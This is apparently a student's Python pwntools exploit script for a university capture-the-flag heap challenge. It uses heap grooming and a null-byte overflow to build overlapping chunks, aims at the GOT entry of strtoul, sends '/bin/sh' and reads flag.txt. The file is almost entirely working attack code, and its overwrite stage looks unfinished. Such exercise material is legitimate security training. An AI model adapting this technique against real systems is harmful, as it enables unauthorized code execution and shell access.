#import from py
import re

#outside imports
from pwn import *

#used for pulling the flag from output
flag_regex = r"flag\{[^}]+\}"
global_timeout = 5 #seconds

#challenge-specific info
host = 'offsec-chalbroker.osiris.cyber.nyu.edu'
port = 1346
netid='pk1898'

do_remote = False
binary_name = './do_the_shrink'

#for doing local debugging
is_local_dbg = True
gdb_script = '''
set pagination off
set disassembly-flavor intel
set follow-fork-mode parent
i proc mappings

b read_boot
command
heap
x/20gx &boots
x/140gx *(&boots)
end

c
'''

#context.log_level ='debug'

#universal flag finder, given a string
def find_flag(input):
    m = re.findall(flag_regex, input)
    if(m != []):
        return m[0]
    else:
        return None

e       = ELF(binary_name)
run_cmd = p64(e.symbols['run_cmd'])


def create_new_boot(target, size, material):
    target.sendlineafter('> ', '1')
    target.sendlineafter('boot?', str(size))
    target.sendlineafter('of?', material)


def delete_boot(target, index):
    target.sendlineafter('> ', '2')
    target.sendlineafter('anymore?', str(index))


def read_boot(target, index):
    if(is_local_dbg):
        target.sendlineafter('> ', '3')
        target.sendlineafter('today?', str(index))
        return target.recvuntil('1.')


def edit_boot(target, index, material):
    target.sendlineafter('> ', '4')
    target.sendlineafter('today?', str(index))
    return target.sendlineafter('boot?', material)



#we groom the heap so that our later chunks are properly aligned
def stage_0_groom_the_heap(target):
    create_new_boot(target, 0x20, '11111')
    create_new_boot(target, 0x20, '22222')
    create_new_boot(target, 0x20, '33333')
    delete_boot(target, 0)
    delete_boot(target, 0)
    delete_boot(target, 0)
    #for debugging, lets read the boots here after stage
    print 'Stage 0: Heap Groomed'
    read_boot(target, 0)
    return


def stage_1_create_large_boots(target):
    #for debugging, lets read the boots here after stage
    create_new_boot(target, 0x100, 'AAAAA')
    create_new_boot(target, 0x250, 'BBBBB')
    create_new_boot(target, 0x100, 'CCCCC')
    print 'Stage 1: Large Boots Allocated'
    read_boot(target, 0)


def stage_2_create_and_shrink(target):
    delete_boot(target, 1) # free B
    print 'Stage 2: Hole Created'
    read_boot(target, 0)
    edit_boot(target, 0, 0x100*'A'+ p64(0x00)) #overflow
    print 'Stage 2: Hole Overflowed'
    read_boot(target, 1)


def stage_3_make_smaller_chunks_in_freed_block(target):
    #for debugging, lets read the boots here after stage
    create_new_boot(target, 0x80, '1'*0x20) #B1 allocation
    create_new_boot(target, 0x80, '2'*0x20) #B2 allocation
    print 'Stage 3: Hole Overwritten'
    read_boot(target, 1)


def stage_4_free_blocks(target):
    #for debugging, lets read the boots here after stage
    delete_boot(target, 2) #free B1
    delete_boot(target, 1) #free C
    print 'Stage 4: Last Boots Deleted'
    #read_boot(target, 0)


def stage_5_create_overlapping_object(target):
    create_new_boot(target, 0x200, '6'*0x150)
    print 'Stage 5: Overlapping Object Created'
    read_boot(target, 1)

    addr_strtoul    = p64(e.got['strtoul'])
    addr_runcmd     = p64(e.symbols['run_cmd'])


def stage_6_run_binsh(target):
    target.sendlineafter('> ', '/bin/sh\x00')
    print 'Stage 7: Shell Finished'


def solve(target):
    stage_0_groom_the_heap(target)
    stage_1_create_large_boots(target)  #Allocate three consecutive chunks: A, B, C
    stage_2_create_and_shrink(target)   #free B ; Overflow from A, making B.size smaller
    stage_3_make_smaller_chunks_in_freed_block(target) #Allocate two new chunks, B1 and B2 in the free space
    stage_4_free_blocks(target)         #Free B1 and C
    stage_5_create_overlapping_object(target) #allocated a final object B, overlapping with B2
    stage_6_run_binsh(target)           #pass our string into run_cmd

    #pull the flag
    target.sendline('cat flag.txt')
    return target.readline()


#universal target setup for remote-only
def target():
    if(do_remote):
        r = remote(host, port)
        r.sendline(netid)
        r.recvline() # eat interstitial
        return r
    else:
        if(is_local_dbg):
            target = gdb.debug(binary_name, gdb_script)
        else:
            target = process(binary_name)
        return target

#scaffolding
def main():
    with target() as p:
        flag = find_flag(solve(p))
    if(flag):
        print "Challenge Solved: %s" % flag
    else:
        print "Challenge Not Solved"

if __name__ == '__main__':
    main()
